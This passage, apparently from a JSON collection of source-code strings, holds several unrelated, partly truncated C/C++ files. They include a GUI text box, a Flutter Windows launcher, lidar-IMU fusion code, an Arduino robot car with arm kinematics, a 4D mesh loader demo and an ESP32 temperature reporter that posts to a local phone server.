(wchar_t)uniCode);\n\t\tcursorIndex++;\n\t}\n}\n\nvoid textBox::keyDown(cvk &keyCode)\n{\n\tcheckCursorIndex();\n\tif (keyCode == vk::Delete && cursorIndex < text.length())\n\t{\n\t\ttext = text.erase(cursorIndex, 1);\n\t}\n\tif (keyCode == vk::BackSpace && cursorIndex > 0)\n\t{\n\t\ttext = text.erase(cursorIndex - 1, 1);\n\t}\n\telse if (keyCode == vk::Left && cursorIndex > 0)\n\t{\n\t\tcursorIndex--;\n\t}\n\telse if (keyCode == vk::Right && cursorIndex < text.length())\n\t{\n\t\tcursorIndex++;\n\t}\n}\n\n// void textBox::keyUp(cvk &keyCode)\n//{\n//\tshift &= (keyCode != VK_SHIFT);\n//\tcapsLock &= (keyCode != VK_CAPITAL);\n// }\n\nvoid textBox::lostFocus()\n{\n\tshift = false;\n\tcapsLock = false;\n}\n\nvoid textBox::paste(const std::wstring &text)\n{\n\tcheckCursorIndex();\n\tthis->text.insert(cursorIndex, text);\n\tcursorIndex += text.length();\n\t// std::wstring clipBoardText;\n\t// if (GetClipboardText(clipBoardText))\n\t//{\n\t//\ttext.insert(cursorIndex, clipBoardText);\n\t//\tcursorIndex += clipBoardText.length();\n\t// }\n}\n\nstd::wstring textBox::copy()\n{\n    return text;\n}\n\nvoid textBox::mouseDown(cveci2 &position, cmb &button)\n{\n\t// check position of cursor\n\n\tcrectangle2 &relativeTextRect = crectangle2(rectanglei2(rect.size).expanded(-borderSize));\n\tvec2 offset = currentFont->MeasureStringOffset(relativeTextRect, std::wstring());\n\tfp closestDistance = INFINITY;\n\tfsize_t closestIndex = 0;\n\tfor (fsize_t i = 0;; i++, offset = currentFont->MeasureLetterOffset(relativeTextRect, offset, text[i]))\n\t{\n\t\tif (position.y > offset.y && position.y < offset.y + currentFont->fontSize)\n\t\t{\n\t\t\tcfp &distance = math::absolute(position.x - offset.x);\n\t\t\tif (distance < closestDistance)\n\t\t\t{\n\t\t\t\tclosestDistance = distance;\n\t\t\t\tclosestIndex = i;\n\t\t\t}\n\t\t}\n\t\tif (i == text.length())\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (closestDistance != INFINITY)\n\t{\n\t\tcursorIndex = closestIndex;\n\t}\n\telse\n\t{\n\t\tif (position.y < offset.y + currentFont->fontSize)\n\t\t{\n\t\t\tcursorIndex = text.length();\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcursorIndex = 0;\n\t\t}\n\t}\n}\n\nvoid textBox::checkCursorIndex()\n{\n\tif (cursorIndex > text.length())\n\t{\n\t\tcursorIndex = text.length();\n\t}\n}\n\nvoid textBox::focus()\n{\n\tcontrol::focus();\n}\n\nbool textBox::wantsTextInput() const\n{\n\treturn focused;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"basico_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"IMU_Processing.hpp\"\n\nImuProcess::ImuProcess() : b_first_frame_(true), imu_need_init_(true), start_timestamp_(-1) {\n    init_iter_num = 1;                           // \u521d\u59cb\u5316\u8fed\u4ee3\u6b21\u6570\n    Q = process_noise_cov();                     // \u8c03\u7528use-ikfom.hpp\u91cc\u9762\u7684process_noise_cov\u521d\u59cb\u5316\u566a\u58f0\u534f\u65b9\u5dee\n    cov_acc = V3D(0.1, 0.1, 0.1);                // \u52a0\u901f\u5ea6\u534f\u65b9\u5dee\u521d\u59cb\u5316\n    cov_gyr = V3D(0.1, 0.1, 0.1);                // \u89d2\u901f\u5ea6\u534f\u65b9\u5dee\u521d\u59cb\u5316\n    cov_bias_gyr = V3D(0.0001, 0.0001, 0.0001);  // \u89d2\u901f\u5ea6bias\u534f\u65b9\u5dee\u521d\u59cb\u5316\n    cov_bias_acc = V3D(0.0001, 0.0001, 0.0001);  // \u52a0\u901f\u5ea6bias\u534f\u65b9\u5dee\u521d\u59cb\u5316\n    mean_acc = V3D(0, 0, -1.0);\n    mean_gyr = V3D(0, 0, 0);\n    angvel_last = Zero3d;                          // \u4e0a\u4e00\u5e27\u89d2\u901f\u5ea6\u521d\u59cb\u5316\n    Lidar_T_wrt_IMU = Zero3d;                      // lidar\u5230IMU\u7684\u4f4d\u7f6e\u5916\u53c2\u521d\u59cb\u5316\n    Lidar_R_wrt_IMU = Eye3d;                       // lidar\u5230IMU\u7684\u65cb\u8f6c\u5916\u53c2\u521d\u59cb\u5316\n    last_imu_.reset(new sensor_msgs::msg::Imu());  // \u4e0a\u4e00\u5e27imu\u521d\u59cb\u5316\n}\n\nImuProcess::~ImuProcess() {}\n\nvoid ImuProcess::Reset()  // \u91cd\u7f6e\u53c2\u6570\n{\n    // std::cout << \"Reset ImuProcess\");\n    mean_acc = V3D(0, 0, -1.0);\n    mean_gyr = V3D(0, 0, 0);\n    angvel_last = Zero3d;\n    imu_need_init_ = true;                         // \u662f\u5426\u9700\u8981\u521d\u59cb\u5316imu\n    start_timestamp_ = -1;                         // \u5f00\u59cb\u65f6\u95f4\u6233\n    init_iter_num = 1;                             // \u521d\u59cb\u5316\u8fed\u4ee3\u6b21\u6570\n    IMUpose.clear();                               // imu\u4f4d\u59ff\u6e05\u7a7a\n    last_imu_.reset(new sensor_msgs::msg::Imu());  // \u4e0a\u4e00\u5e27imu\u521d\u59cb\u5316\n    cur_pcl_un_.reset(new PointCloudXYZI());       // \u5f53\u524d\u5e27\u70b9\u4e91\u672a\u53bb\u7578\u53d8\u521d\u59cb\u5316\n}\n\n// \u4f20\u5165\u5916\u90e8\u53c2\u6570\nvoid ImuProcess::set_param(const V3D& transl, const M3D& rot, const V3D& gyr, const V3D& acc, const V3D& gyr_bias, const V3D& acc_bias) {\n    Lidar_T_wrt_IMU = transl;\n    Lidar_R_wrt_IMU = rot;\n    cov_gyr_scale = gyr;\n    cov_acc_scale = acc;\n    cov_bias_gyr = gyr_bias;\n    cov_bias_acc = acc_bias;\n}\n\n// IMU\u521d\u59cb\u5316\uff1a\u5229\u7528\u5f00\u59cb\u7684IMU\u5e27\u7684\u5e73\u5747\u503c\u521d\u59cb\u5316\u72b6\u6001\u91cfx\nvoid ImuProcess::IMU_init(const MeasureGroup& meas, esekfom::esekf& kf_state, int& N) {\n    // MeasureGroup\u8fd9\u4e2astruct\u8868\u793a\u5f53\u524d\u8fc7\u7a0b\u4e2d\u6b63\u5728\u5904\u7406\u7684\u6240\u6709\u6570\u636e\uff0c\u5305\u542bIMU\u961f\u5217\u548c\u4e00\u5e27lidar\u7684\u70b9\u4e91 \u4ee5\u53calidar\u7684\u8d77\u59cb\u548c\u7ed3\u675f\u65f6\u95f4\n    // \u521d\u59cb\u5316\u91cd\u529b\u3001\u9640\u87ba\u4eea\u504f\u5dee\u3001acc\u548c\u9640\u87ba\u4eea\u534f\u65b9\u5dee  \u5c06\u52a0\u901f\u5ea6\u6d4b\u91cf\u503c\u5f52\u4e00\u5316\u4e3a\u5355\u4f4d\u91cd\u529b   **/\n    V3D cur_acc, cur_gyr;\n\n    if (b_first_frame_)  // \u5982\u679c\u4e3a\u7b2c\u4e00\u5e27IMU\n    {\n        Reset();  // \u91cd\u7f6eIMU\u53c2\u6570\n        N = 1;    // \u5c06\u8fed\u4ee3\u6b21\u6570\u7f6e1\n        b_first_frame_ = false;\n        const auto& imu_acc = meas.imu.front()->linear_acceleration;  // IMU\u521d\u59cb\u65f6\u523b\u7684\u52a0\u901f\u5ea6\n        const auto& gyr_acc = meas.imu.front()->angular_velocity;     // IMU\u521d\u59cb\u65f6\u523b\u7684\u89d2\u901f\u5ea6\n        mean_acc << imu_acc.x, imu_acc.y, imu_acc.z;                  // \u7b2c\u4e00\u5e27\u52a0\u901f\u5ea6\u503c\u4f5c\u4e3a\u521d\u59cb\u5316\u5747\u503c\n        mean_gyr << gyr_acc.x, gyr_acc.y, gyr_acc.z;                  // \u7b2c\u4e00\u5e27\u89d2\u901f\u5ea6\u503c\u4f5c\u4e3a\u521d\u59cb\u5316\u5747\u503c\n        first_lidar_time = meas.lidar_beg_time;                       // \u5c06\u5f53\u524dIMU\u5e27\u5bf9\u5e94\u7684lidar\u8d77\u59cb\u65f6\u95f4 \u4f5c\u4e3a\u521d\u59cb\u65f6\u95f4\n    }\n\n    for (const auto& imu : meas.imu)  // \u6839\u636e\u6240\u6709IMU\u6570\u636e\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u548c\u65b9\u5dee\n    {\n        const auto& imu_acc = imu->linear_acceleration;\n        const auto& gyr_acc = imu->angular_velocity;\n        cur_acc << imu_acc.x, imu_acc.y, imu_acc.z;\n        cur_gyr << gyr_acc.x, gyr_acc.y, gyr_acc.z;\n\n        mean_acc += (cur_acc - mean_acc) / N;  // \u6839\u636e\u5f53\u524d\u5e27\u548c\u5747\u503c\u5dee\u4f5c\u4e3a\u5747\u503c\u7684\u66f4\u65b0\n        mean_gyr += (cur_gyr - mean_gyr) / N;\n\n        cov_acc = cov_acc * (N - 1.0) / N + (cur_acc - mean_acc).cwiseProduct(cur_acc - mean_acc) / N;\n        cov_gyr = cov_gyr * (N - 1.0) / N + (cur_gyr - mean_gyr).cwiseProduct(cur_gyr - mean_gyr) / N / N * (N - 1);\n\n        N++;\n    }\n\n    state_ikfom init_state = kf_state.get_x();               // \u5728esekfom.hpp\u83b7\u5f97x_\u7684\u72b6\u6001\n    init_state.grav = -mean_acc / mean_acc.norm() * G_m_s2;  // \u5f97\u5e73\u5747\u6d4b\u91cf\u7684\u5355\u4f4d\u65b9\u5411\u5411\u91cf * \u91cd\u529b\u52a0\u901f\u5ea6\u9884\u8bbe\u503c\n\n    init_state.bg = mean_gyr;                   // \u89d2\u901f\u5ea6\u6d4b\u91cf\u4f5c\u4e3a\u9640\u87ba\u4eea\u504f\u5dee\n    init_state.offset_T_L_I = Lidar_T_wrt_IMU;  // \u5c06lidar\u548cimu\u5916\u53c2\u4f20\u5165\n    init_state.offset_R_L_I = Sophus::SO3(Lidar_R_wrt_IMU);\n    kf_state.change_x(init_state);  // \u5c06\u521d\u59cb\u5316\u540e\u7684\u72b6\u6001\u4f20\u5165esekfom.hpp\u4e2d\u7684x_\n\n    Eigen::Matrix<double, 24, 24> init_P = Eigen::MatrixXd::Identity(24, 24);  // \u5728esekfom.hpp\u83b7\u5f97P_\u7684\u534f\u65b9\u5dee\u77e9\u9635\n    init_P(6, 6) = init_P(7, 7) = init_P(8, 8) = 0.00001;\n    init_P(9, 9) = init_P(10, 10) = init_P(11, 11) = 0.00001;\n    init_P(15, 15) = init_P(16, 16) = init_P(17, 17) = 0.0001;\n    init_P(18, 18) = init_P(19, 19) = init_P(20, 20) = 0.001;\n    init_P(21, 21) = init_P(22, 22) = init_P(23, 23) = 0.00001;\n    kf_state.change_P(init_P);\n    last_imu_ = meas.imu.back();\n\n    // std::cout << \"IMU init new -- init_state  \" << init_state.pos  <<\" \" << init_state.bg <<\" \" << init_state.ba <<\" \" << init_state.grav << std::endl;\n}\n\n// \u53cd\u5411\u4f20\u64ad\nvoid ImuProcess::UndistortPcl(const MeasureGroup& meas, esekfom::esekf& kf_state, PointCloudXYZI& pcl_out) {\n    /***\u5c06\u4e0a\u4e00\u5e27\u6700\u540e\u5c3e\u90e8\u7684imu\u6dfb\u52a0\u5230\u5f53\u524d\u5e27\u5934\u90e8\u7684imu ***/\n    auto v_imu = meas.imu;                                                  // \u53d6\u51fa\u5f53\u524d\u5e27\u7684IMU\u961f\u5217\n    v_imu.push_front(last_imu_);                                            // \u5c06\u4e0a\u4e00\u5e27\u6700\u540e\u5c3e\u90e8\u7684imu\u6dfb\u52a0\u5230\u5f53\u524d\u5e27\u5934\u90e8\u7684imu\n    const double& imu_end_time = get_time_sec(v_imu.back()->header.stamp);  // \u62ff\u5230\u5f53\u524d\u5e27\u5c3e\u90e8\u7684imu\u7684\u65f6\u95f4\n    const double& pcl_beg_time = meas.lidar_beg_time;                       // \u70b9\u4e91\u5f00\u59cb\u548c\u7ed3\u675f\u7684\u65f6\u95f4\u6233\n    const double& pcl_end_time = meas.lidar_end_time;\n\n    // \u6839\u636e\u70b9\u4e91\u4e2d\u6bcf\u4e2a\u70b9\u7684\u65f6\u95f4\u6233\u5bf9\u70b9\u4e91\u8fdb\u884c\u91cd\u6392\u5e8f\n    pcl_out = *(meas.lidar);\n    sort(pcl_out.poin",
    "#include <Arduino.h>\r\n#include <RF24.h>\r\n#include <RF24Network.h>\r\n#include <Servo.h>\r\n#include <SPI.h>\r\n#include <Wire.h>\r\n\r\nRF24 radio(30, 31);  //CE and CSN pins\r\nconst byte address[6] = \"00001\";\r\n\r\n\r\n#define PWM_LF  7     //\u5de6\u524dPWM\u5f15\u811a\r\n#define PWM_LB  8     //\u5de6\u540ePWM\u5f15\u811a\r\n#define PWM_RF  9     //\u53f3\u524dPWM\u5f15\u811a\r\n#define PWM_RB  10    //\u53f3\u540ePWM\u5f15\u811a\r\n#define INA_LF  26           \r\n#define INB_LF  27    \r\n#define INA_LB  28           \r\n#define INB_LB  29   \r\n#define INA_RF  22           \r\n#define INB_RF  23   \r\n#define INA_RB  24           \r\n#define INB_RB  25\r\n\r\nint pwma = 0;\r\n\r\n//\u58f0\u660e\u8235\u673a\u5bf9\u8c61\r\nServo servo_arm;\r\nServo servo_wrist;\r\nServo servo_base;\r\nServo servo_rotation;\r\nServo servo_actuator;\r\n\r\nint i = 0;\r\n\r\ndouble servo_actuator_value = 0;\r\n\r\nconst int base_height = 102;    //\u5e95\u5ea7\u9ad8\u5ea6\r\nconst int arm_length = 140;     //\u5927\u81c2\u957f\u5ea6\r\nconst int wrist_length = 150;   //\u5c0f\u81c2\u957f\u5ea6\r\ndouble x = 0;\r\ndouble y = -30;\r\ndouble z = 102;\r\nstruct robot_arm \r\n{\r\n    double base_value;\r\n    double arm_value;\r\n    double wrist_value;\r\n};\r\nrobot_arm data_1;\r\n\r\nint joyMiddle = 130;           //\u6447\u6746\u4e2d\u5fc3\u4f4d\u7f6e\r\nint joyDeadzone = 20;          //\u6447\u6746\u6b7b\u533a\r\n\r\nstruct Data_Package {\r\n  byte j1PotX;\r\n  byte j1PotY;\r\n  byte j1Button;\r\n  byte j2PotX;\r\n  byte j2PotY;\r\n  byte j2Button;\r\n  byte pot1;\r\n  byte pot2;\r\n  byte tSwitch1;\r\n  byte tSwitch2;\r\n  byte button1;\r\n  byte button2;\r\n  byte button3;\r\n  byte button4;\r\n  byte roll;\r\n  byte pitch;\r\n};\r\nData_Package data;\r\n\r\nvoid forward() \r\n{\r\n  digitalWrite(INA_LF, LOW );\r\n  digitalWrite(INB_LF, HIGH);\r\n  analogWrite (PWM_LF, pwma);\r\n\r\n  digitalWrite(INA_LB, LOW );\r\n  digitalWrite(INB_LB, HIGH);\r\n  analogWrite (PWM_LB, pwma);\r\n\r\n  digitalWrite(INA_RF, LOW );\r\n  digitalWrite(INB_RF, HIGH);\r\n  analogWrite (PWM_RF, pwma);\r\n\r\n  digitalWrite(INA_RB, LOW );\r\n  digitalWrite(INB_RB, HIGH);\r\n  analogWrite (PWM_RB, pwma);\r\n}\r\n\r\nvoid back() \r\n{\r\n  digitalWrite(INA_LF, HIGH);\r\n  digitalWrite(INB_LF, LOW );\r\n  analogWrite (PWM_LF, pwma);\r\n\r\n  digitalWrite(INA_LB, HIGH);\r\n  digitalWrite(INB_LB, LOW );\r\n  analogWrite (PWM_LB, pwma);\r\n\r\n  digitalWrite(INA_RF, HIGH);\r\n  digitalWrite(INB_RF, LOW );\r\n  analogWrite (PWM_RF, pwma);\r\n\r\n  digitalWrite(INA_RB, HIGH);\r\n  digitalWrite(INB_RB, LOW );\r\n  analogWrite (PWM_RB, pwma);\r\n}\r\n\r\nvoid left() \r\n{\r\n  digitalWrite(INA_LF, HIGH);\r\n  digitalWrite(INB_LF, LOW );\r\n  analogWrite (PWM_LF, pwma);\r\n\r\n  digitalWrite(INA_LB, HIGH);\r\n  digitalWrite(INB_LB, LOW );\r\n  analogWrite (PWM_LB, pwma);\r\n\r\n  digitalWrite(INA_RF, LOW );\r\n  digitalWrite(INB_RF, HIGH);\r\n  analogWrite (PWM_RF, pwma);\r\n\r\n  digitalWrite(INA_RB, LOW );\r\n  digitalWrite(INB_RB, HIGH);\r\n  analogWrite (PWM_RB, pwma);\r\n}\r\n\r\nvoid right() \r\n{\r\n  digitalWrite(INA_LF, LOW );\r\n  digitalWrite(INB_LF, HIGH);\r\n  analogWrite (PWM_LF, pwma);\r\n\r\n  digitalWrite(INA_LB, LOW );\r\n  digitalWrite(INB_LB, HIGH);\r\n  analogWrite (PWM_LB, pwma);\r\n\r\n  digitalWrite(INA_RF, HIGH);\r\n  digitalWrite(INB_RF, LOW );\r\n  analogWrite (PWM_RF, pwma);\r\n\r\n  digitalWrite(INA_RB, HIGH);\r\n  digitalWrite(INB_RB, LOW );\r\n  analogWrite (PWM_RB, pwma);\r\n}\r\n\r\nvoid stop() \r\n{\r\n  digitalWrite(INA_LF, LOW );\r\n  digitalWrite(INB_LF, LOW );\r\n  analogWrite (PWM_LF, pwma);\r\n\r\n  digitalWrite(INA_LB, LOW );\r\n  digitalWrite(INB_LB, LOW );\r\n  analogWrite (PWM_LB, pwma);\r\n\r\n  digitalWrite(INA_RF, LOW );\r\n  digitalWrite(INB_RF, LOW );\r\n  analogWrite (PWM_RF, pwma);\r\n\r\n  digitalWrite(INA_RB, LOW );\r\n  digitalWrite(INB_RB, LOW );\r\n  analogWrite (PWM_RB, pwma);\r\n}\r\n\r\n// void servo_initial()\r\n// {\r\n//   servo_base.write(pos_bottom);\r\n//   servo_arm.write(pos_left);\r\n//   servo_wrist.write(pos_right);\r\n//   servo_base_value = pos_bottom;\r\n//   servo_arm_value = pos_left;\r\n//   servo_wrist_value = pos_right;\r\n// }\r\n\r\nvoid calculateAngles() {\r\n    //\u5e95\u5ea7\u89d2\u5ea6\r\n    double base_angle = atan2(x, y);\r\n\r\n    //\u5927\u81c2\u89d2\r\n    double vertical_projection = sqrt(pow(x, 2) + pow(y, 2));\r\n    double short_edge = abs(base_height - z);\r\n    double hypotenuse = sqrt(pow(short_edge, 2) + pow(vertical_projection, 2));\r\n    double arm_angle1 = acos((pow(arm_length, 2) + pow(hypotenuse, 2) - pow(wrist_length, 2)) / (2 * arm_length * hypotenuse));\r\n    double arm_angle2;\r\n\r\n    if (base_height == z) {\r\n        arm_angle2 = 0; // + PI / 4;\r\n    } else if (base_height > z) {\r\n        arm_angle2 = atan2(vertical_projection, short_edge ) - PI / 2;\r\n    }\r\n     else if (base_height < z) {\r\n        arm_angle2 = atan2(short_edge,vertical_projection);\r\n    }\r\n    double arm_angle = (arm_angle1 + arm_angle2) * 180 /PI;\r\n\r\n    //\u5c0f\u81c2\u89d2\r\n    double wrist_angle = acosf((pow(arm_length, 2) + pow(wrist_length, 2) - pow(hypotenuse, 2)) / (2.0 * arm_length * wrist_length)) * 180 /PI + arm_angle - 90;\r\n    double base_value = base_angle * 180 / PI;\r\n\r\n    data_1.base_value = base_value - 45;\r\n    data_1.arm_value = arm_angle + 15;//left   \r\n    data_1.wrist_value =60-wrist_angle;//right \r\n}\r\n\r\nvoid setup()\r\n{\r\n  SPI.begin();\r\n  Serial.begin(9600);\r\n  radio.begin();\r\n  radio.openReadingPipe(0, address);\r\n  radio.setAutoAck(false);\r\n  radio.setDataRate(RF24_250KBPS);\r\n  rad",
    "#include <cstdlib>\n#include <4do/4do.h>\n\n#ifdef _WIN32\n#include <windows.h>\n#endif\n\nint main()\n{\n\t#ifdef _WIN32\n\tSetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), ENABLE_VIRTUAL_TERMINAL_PROCESSING | ENABLE_PROCESSED_OUTPUT); // enable ansi colors in windows terminal\n\t#endif\n\tfdo::Logger::ansiColors = true;\n\n\tfdo::Logger::logToConsole = true;\n\n\tfdo::Object obj = fdo::Object::load4DOFromFile(\"./example.4do\");\n\n\tprintf(\"Is valid?: %s\\n\", !obj.isInvalid() ? \"true\" : \"false\");\n\tprintf(\"Spec Ver: %d\\n\", obj.specVer);\n\tprintf(\"Orientation: %s\\n\", obj.orientation.toString().c_str());\n\n\tif(obj.isInvalid()) return 1;\n\n\tint i = 0;\n\tfor(auto& v : obj.vertices)\n\t{\n\t\tprintf(\"Vertex %d: %s\\n\", i++, v.toString().c_str());\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& n : obj.normals)\n\t{\n\t\tprintf(\"Normal %d: %s\\n\", i++, n.toString().c_str());\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& c : obj.colors)\n\t{\n\t\tprintf(\"Color %d: %s\\n\", i++, c.toString().c_str());\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& t : obj.texCoords)\n\t{\n\t\tprintf(\"TexCoord %d: %s\\n\", i++, t.toString().c_str());\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& t : obj.tetrahedra)\n\t{\n\t\tprintf(\"\\nTetrahedron %d:\", i++);\n\t\tprintf(\"\\n\\tvIndices:\");\n\t\tfor(auto& v : t.vIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tvnIndices:\");\n\t\tfor(auto& v : t.vnIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tvtIndices:\");\n\t\tfor(auto& v : t.vtIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tcoIndices:\");\n\t\tfor(auto& v : t.coIndices)\n\t\t\tprintf(\" %d\", v);\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& t : obj.cells)\n\t{\n\t\tprintf(\"\\nCell %d:\", i++);\n\t\tprintf(\"\\n\\ttIndices:\");\n\t\tfor(auto& v : t.tIndices)\n\t\t\tprintf(\" %d\", v);\n\t}\n\tprintf(\"\\n\");\n\ti = 0;\n\tfor(auto& t : obj.polylines)\n\t{\n\t\tprintf(\"\\nPolyline %d:\", i++);\n\t\tprintf(\"\\n\\tvIndices:\");\n\t\tfor(auto& v : t.vIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tvnIndices:\");\n\t\tfor(auto& v : t.vnIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tvtIndices:\");\n\t\tfor(auto& v : t.vtIndices)\n\t\t\tprintf(\" %d\", v);\n\t\tprintf(\"\\n\\tcoIndices:\");\n\t\tfor(auto& v : t.coIndices)\n\t\t\tprintf(\" %d\", v);\n\t}\n\n\treturn 0;\n}\n",
    "\n#include \"TempSensor.h\"\n#include <cmath>\n#include <string>\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"esp_event.h\"\n#include \"esp_log.h\"\n#include \"esp_netif.h\"\n#include \"esp_sntp.h\"\n#include \"esp_system.h\"\n#include \"esp_timer.h\"\n#include \"esp_wifi.h\"\n#include \"freertos/FreeRTOS.h\"\n#include \"freertos/event_groups.h\"\n#include \"freertos/task.h\"\n#include \"nvs.h\"\n#include \"nvs_flash.h\"\n#include \"protocol_examples_common.h\"\n#include <inttypes.h>\n#include <stdlib.h>\n#include <sys/time.h>\n#include <time.h>\n\n#include \"lwip/dns.h\"\n#include \"lwip/err.h\"\n#include \"lwip/netdb.h\"\n#include \"lwip/sockets.h\"\n#include \"lwip/sys.h\"\n\n#include \"esp_tls.h\"\n#include \"sdkconfig.h\"\n#if CONFIG_MBEDTLS_CERTIFICATE_BUNDLE && CONFIG_EXAMPLE_USING_ESP_TLS_MBEDTLS\n#include \"esp_crt_bundle.h\"\n#endif\n#include \"time_sync.h\"\n\n#define WEB_SERVER \"wttr.in\"\n#define WEB_PORT \"443\"\n#define WEB_URL \"https://wttr.in?format=%t&m\"\n#define WEB_PATH \"/?format=%t&m\"\n\n#define SERVER_URL_MAX_SZ 256\n\nstatic const char *TAG = \"example\";\n\n#define TIME_PERIOD (86400000000ULL)\n\nstatic const char HOWSMYSSL_REQUEST[] = \"GET \" WEB_PATH \" HTTP/1.1\\r\\n\"\n                                        \"Host: \" WEB_SERVER \"\\r\\n\"\n                                        \"User-Agent: esp-idf/1.0 esp32\\r\\n\"\n                                        \"\\r\\n\";\n\nstatic char https_response_body[512] = \"\";\nstatic char http_response_body[512] = \"\";\nstatic int roundedTemperature = 0;\nstatic int roundedHumidity = 0;\n\nextern const uint8_t\n    server_root_cert_pem_start[] asm(\"_binary_server_root_cert_pem_start\");\nextern const uint8_t\n    server_root_cert_pem_end[] asm(\"_binary_server_root_cert_pem_end\");\n\nextern const uint8_t\n    local_server_cert_pem_start[] asm(\"_binary_local_server_cert_pem_start\");\nextern const uint8_t\n    local_server_cert_pem_end[] asm(\"_binary_local_server_cert_pem_end\");\n\n#define PHONE_SERVER \"10.0.0.179\"\n#define PHONE_PORT \"1234\"\n#define PHONE_POST_URL \"http://10.0.0.179:1234/store_data\"\n#define PHONE_POST_PATH \"/store_data\"\n\nstatic const char *POST_REQUEST_FORMAT =\n    \"POST \" PHONE_POST_PATH \" HTTP/1.1\\r\\n\"\n    \"Host: \" PHONE_SERVER \":\" PHONE_PORT \"\\r\\n\"\n    \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n    \"Content-Length: %d\\r\\n\"\n    \"User-Agent: esp-idf/1.0 esp32\\r\\n\"\n    \"\\r\\n\"\n    \"%s\";\n\nstatic void http_post_task(void) {\n  const struct addrinfo hints = {\n      .ai_family = AF_INET,\n      .ai_socktype = SOCK_STREAM,\n  };\n  struct addrinfo *res;\n  struct in_addr *addr;\n  int s, r;\n  char recv_buf[512];\n  char post_data[256];\n\n  // Construct the post_data with the global variables\n  snprintf(post_data, sizeof(post_data),\n           \"wttrTemp=%s&localTemp=%d&localHumidity=%d&location=%s\",\n           https_response_body, roundedTemperature, roundedHumidity,\n           http_response_body);\n\n  int err = getaddrinfo(PHONE_SERVER, PHONE_PORT, &hints, &res);\n\n  if (err != 0 || res == NULL) {\n    ESP_LOGE(TAG, \"DNS lookup failed err=%d res=%p\", err, res);\n    vTaskDelay(1000 / portTICK_PERIOD_MS);\n    return;\n  }\n\n  addr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;\n  ESP_LOGI(TAG, \"DNS lookup succeeded. IP=%s\", inet_ntoa(*addr));\n\n  s = socket(res->ai_family, res->ai_socktype, 0);\n  if (s < 0) {\n    ESP_LOGE(TAG, \"... Failed to allocate socket.\");\n    freeaddrinfo(res);\n    vTaskDelay(1000 / portTICK_PERIOD_MS);\n    return;\n  }\n  ESP_LOGI(TAG, \"... allocated socket\");\n\n  if (connect(s, res->ai_addr, res->ai_addrlen) != 0) {\n    ESP_LOGE(TAG, \"... socket connect failed errno=%d\", errno);\n    close(s);\n    freeaddrinfo(res);\n    vTaskDelay(4000 / portTICK_PERIOD_MS);\n    return;\n  }\n\n  ESP_LOGI(TAG, \"... connected\");\n  freeaddrinfo(res);\n\n  char request[1024];\n  snprintf(request, sizeof(request), POST_REQUEST_FORMAT, strlen(post_data),\n           post_data);\n\n  if (write(s, request, strlen(request)) < 0) {\n    ESP_LOGE(TAG, \"... socket send failed\");\n    close(s);\n    vTaskDelay(4000 / portTICK_PERIOD_MS);\n    return;\n  }\n  ESP_LOGI(TAG, \"... socket send success\");\n\n  struct timeval receiving_timeout;\n  receiving_timeout.tv_sec = 5;\n  receiving_timeout.tv_usec = 0;\n  if (setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &receiving_timeout,\n                 sizeof(receiving_timeout)) < 0) {\n    ESP_LOGE(TAG, \"... failed to set socket receiving timeout\");\n    close(s);\n    vTaskDelay(4000 / portTICK_PERIOD_MS);\n    return;\n  }\n  ESP_LOGI(TAG, \"... set socket receiving timeout success\");\n\n  ESP_LOGI(TAG, \"Reading HTTP response...\");\n  do {\n    bzero(recv_buf, sizeof(recv_buf));\n    r = read(s, recv_buf, sizeof(recv_buf) - 1);\n    if (r < 0) {\n      ESP_LOGE(TAG, \"Error reading from socket errno=%d\", errno);\n      break;\n    } else if (r == 0) {\n      ESP_LOGI(TAG, \"Connection closed\");\n      break;\n    }\n\n    recv_buf[r] = '\\0'; // Ensure null-terminated string\n\n    // Check if body has started\n    char *body_start = strstr(recv_buf, \"\\r\\n\\r\\n\");\n    if (body_start != NULL) {\n      body_start += 4; // Move past the header delimiter\n      ESP_LOGI(TAG, \"Received H",
